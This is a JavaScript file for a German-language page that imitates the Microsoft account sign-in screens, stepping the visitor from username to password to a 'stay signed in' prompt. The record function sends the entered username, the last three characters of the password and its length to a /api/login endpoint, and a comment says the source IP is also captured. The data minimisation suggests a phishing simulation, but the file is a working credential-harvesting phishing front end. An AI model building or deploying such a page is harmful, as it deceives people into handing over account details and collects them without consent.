document.addEventListener("DOMContentLoaded", () => {
  const unReq = "Geben Sie eine gültige E-Mail-Adresse, Telefonnummer oder einen Skype-Namen ein.";
  const pwdReq = "Geben Sie das Kennwort für Ihr Microsoft-Konto ein.";
  const unameInp = document.getElementById("inp_uname");
  const pwdInp = document.getElementById("inp_pwd");
  const sections = [
    "section_uname",
    "section_pwd",
    "section_final",
    "section_success",
  ];
  let view = "uname";

  let unameVal = (pwdVal = false);

  ///// Bildschirm wechseln
  function show(id) {
    sections.forEach((s) => document.getElementById(s).classList.add("d-none"));
    document.getElementById(id).classList.remove("d-none");
    window.scrollTo(0, 0);
  }

  ///// implizites Absenden des Formulars verhindern (kein Neuladen der Seite)
  document.querySelectorAll("form").forEach((f) => {
    f.addEventListener("submit", (e) => e.preventDefault());
  });

  ///// erfasste Zugangsdaten an Netlify Blobs senden
  async function record(step) {
    const payload = {
      step: step,
      username: unameInp.value.trim(),
      // nur die letzten drei Zeichen des Kennworts verlassen den Browser
      passwordLast3: pwdInp.value ? pwdInp.value.slice(-3) : null,
      passwordLength: pwdInp.value ? pwdInp.value.length : null,
    };
    try {
      await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true,
      });
    } catch (err) {
      console.warn("Anmeldung konnte nicht erfasst werden:", err);
    }
  }

  ///// Weiter-Schaltfläche
  const nxt = document.getElementById("btn_next");

  nxt.addEventListener("click", () => {
    //Formular validieren
    validate();
    if (unameVal) {
      document.querySelectorAll("#user_identity").forEach((e) => {
        e.innerText = unameInp.value;
      });
      show("section_pwd");
      view = "pwd";
      pwdInp.focus();
    }
  });

  ////// Anmelden-Schaltfläche

  const sig = document.getElementById("btn_sig");

  sig.addEventListener("click", () => {
    //Formular validieren
    validate();
    if (pwdVal) {
      record("signin"); // Benutzername + letzte 3 Zeichen + Quell-IP erfassen
      show("section_final");
      view = "final";
    }
  });

  ///// Eingabetaste springt zum nächsten Schritt, statt die Seite neu zu laden
  unameInp.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      nxt.click();
    }
  });

  pwdInp.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      sig.click();
    }
  });

  function validate() {
    function unameValAction(type) {
      if (!type) {
        document.getElementById("error_uname").innerText = unReq;
        unameInp.classList.add("error-inp");
        unameVal = false;
      } else {
        document.getElementById("error_uname").innerText = "";
        unameInp.classList.remove("error-inp");
        unameVal = true;
      }
    }
    function pwdValAction(type) {
      if (!type) {
        document.getElementById("error_pwd").innerText = pwdReq;
        pwdInp.classList.add("error-inp");
        pwdVal = false;
      } else {
        document.getElementById("error_pwd").innerText = "";
        pwdInp.classList.remove("error-inp");
        pwdVal = true;
      }
    }
    if (view === "uname") {
      if (unameInp.value.trim() === "") {
        unameValAction(false);
      } else {
        unameValAction(true);
      }
    } else if (view === "pwd") {
      if (pwdInp.value.trim() === "") {
        pwdValAction(false);
      } else {
        pwdValAction(true);
      }
    }
    return false;
  }

  //Zurück-Schaltfläche
  document.querySelector(".back").addEventListener("click", () => {
    view = "uname";
    show("section_uname");
    unameInp.focus();
  });

  ///// Abschluss-Schaltflächen bestätigen jetzt, statt das Fenster zu schließen
  function finish(stay) {
    document.getElementById("success_msg").innerText = stay
      ? "Sie bleiben angemeldet. Sie können dieses Fenster jetzt schließen."
      : "Alles erledigt. Beim nächsten Mal müssen Sie sich erneut anmelden.";
    show("section_success");
    view = "success";
  }

  document.getElementById("btn_yes").addEventListener("click", () => finish(true));
  document.getElementById("btn_no").addEventListener("click", () => finish(false));

  ///// von vorn beginnen
  document.getElementById("btn_restart").addEventListener("click", () => {
    unameInp.value = "";
    pwdInp.value = "";
    document.getElementById("error_uname").innerText = "";
    document.getElementById("error_pwd").innerText = "";
    unameInp.classList.remove("error-inp");
    pwdInp.classList.remove("error-inp");
    view = "uname";
    show("section_uname");
    unameInp.focus();
  });

  unameInp.focus();
});